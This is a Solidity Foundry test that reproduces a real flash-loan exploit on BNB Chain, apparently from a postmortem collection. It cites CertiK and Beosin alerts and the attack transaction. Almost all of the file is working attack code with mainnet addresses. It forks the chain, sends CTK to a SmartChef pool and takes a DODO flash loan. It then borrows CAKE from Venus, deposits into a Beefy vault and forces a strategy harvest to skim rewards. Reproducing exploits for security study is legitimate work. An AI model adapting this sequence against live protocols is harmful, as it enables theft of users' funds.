// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BeosinAlert/status/1589501207181393920
// https://twitter.com/CertiKAlert/status/1589428153591615488
// TX
// https://bscscan.com/tx/0x03d363462519029cf9a544d44046cad0c7e64c5fb1f2adf5dd5438a9a0d2ec8e

interface VBUSD {
    function mint(uint256 mintAmount) external;
    function redeemUnderlying(uint256 redeemAmount) external;
}

interface VCAKE {
    function borrow(uint256 borrowAmount) external;
    function repayBorrow(uint256 repayAmount) external;
}

interface BeefyVault {
    function depositAll() external;
    function withdrawAll() external;
}

interface StrategySyrup {
    function harvest() external;
}

contract Harvest {
    constructor() {
        StrategySyrup strategySyrup = StrategySyrup(0xC2562DD7E4CAeE53DF0f9cD7d4dDDAa53bcD3D9b);
        strategySyrup.harvest();
    }
}

interface Unitroller {
    function getAccountLiquidity(address account) external returns (uint256, uint256, uint256);
    function enterMarkets(address[] calldata vTokens) external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 CTK = IERC20(0xA8c2B8eec3d368C0253ad3dae65a5F2BBB89c929);
    IERC20 BUSD = IERC20(0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56);
    IERC20 CAKE = IERC20(0x0E09FaBB73Bd3Ade0a17ECC321fD13a19e81cE82);
    VBUSD vBUSD = VBUSD(0x95c78222B3D6e262426483D42CfA53685A67Ab9D);
    VCAKE vCAKE = VCAKE(0x86aC3974e2BD0d60825230fa6F355fF11409df5c);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Unitroller unitroller = Unitroller(0xfD36E2c2a6789Db23113685031d7F16329158384);
    BeefyVault beefyVault = BeefyVault(0x489afbAED0Ea796712c9A6d366C16CA3876D8184);
    address constant dodo = 0x0fe261aeE0d1C4DFdDee4102E82Dd425999065F4;
    address constant SmartChef = 0xF35d63Df93f32e025bce4A1B98dcEC1fe07AD892;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        // the ankr rpc maybe dont work , please use QuickNode
        cheats.createSelectFork("bsc", 22_832_427);
    }

    function testExploit() public {
        address(WBNB).call{value: 3 ether}("");
        WBNBToCTK();
        CTK.transfer(address(SmartChef), CTK.balanceOf(address(this)));
        DVM(dodo).flashLoan(0, 400_000 * 1e18, address(this), new bytes(1));

        emit log_named_decimal_uint("[End] Attacker CAKE balance after exploit", CAKE.balanceOf(address(this)), 18);
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        address[] memory cTokens = new address[](2);
        cTokens[0] = address(vBUSD);
        cTokens[1] = address(vCAKE);
        unitroller.enterMarkets(cTokens);
        BUSD.approve(address(vBUSD), type(uint256).max);
        vBUSD.mint(BUSD.balanceOf(address(this)));
        vCAKE.borrow(50_000 * 1e18);
        CAKE.approve(address(beefyVault), type(uint256).max);
        beefyVault.depositAll();
        // Removing this step, the profit seem to be higher 😂
        // because the harveset() funciton will swap some CAKE to WBNB
        Harvest harvest = new Harvest();
        beefyVault.withdrawAll();
        CAKE.approve(address(vCAKE), type(uint256).max);
        vCAKE.repayBorrow(50_000 * 1e18);
        vBUSD.redeemUnderlying(400_000 * 1e18);
        BUSD.transfer(dodo, 400_000 * 1e18);
    }

    function WBNBToCTK() internal {
        WBNB.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(CTK);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
